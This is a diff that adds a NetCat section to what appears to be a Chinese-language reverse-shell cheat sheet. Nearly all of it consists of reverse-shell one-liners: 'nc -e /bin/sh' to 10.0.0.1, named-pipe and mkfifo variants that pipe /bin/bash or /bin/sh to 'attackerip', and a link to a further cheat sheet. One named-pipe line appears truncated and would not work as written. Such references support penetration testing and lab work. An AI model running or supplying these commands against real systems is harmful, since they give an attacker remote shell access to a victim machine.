@@ -1,3 +1,20 @@
+0x06 NetCat
+```
+nc -e /bin/sh 10.0.0.1 1234　　#不同版本的nc不一定支持-e选项
+```
+不能使用-e选项时：
+```
+mknod backpipe p && nc attackerip 8080 0<backpipe | /bin/bash 1>backpipe
+/bin/sh | nc attackerip 4444
+rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/
+```
+安装的NC版本有问题时：
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
+https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html
+
+
 bash直接反弹
 靶机
 ```
